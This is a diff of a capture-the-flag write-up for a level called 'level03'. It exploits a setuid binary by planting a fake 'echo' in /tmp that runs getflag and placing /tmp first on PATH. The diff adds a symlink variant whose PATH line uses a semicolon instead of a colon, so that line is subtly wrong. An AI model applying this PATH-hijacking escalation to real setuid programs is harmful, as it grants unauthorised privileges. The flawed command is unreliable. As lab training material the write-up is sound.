@@ -1,4 +1,4 @@
-resolution level03:
+solution level03:
 
 -> ls -la
 -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
@@ -13,6 +13,9 @@ objdump -S -j .rodata level03
 
 -> we can change the PATH environment variable to use a fake echo which will execute the getflag command
 echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH;
+
+(we can also create a symbolic link)
+ln -s /bin/getflag /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp;$PATH;
 
 -> we execute the exploit
 ./level03
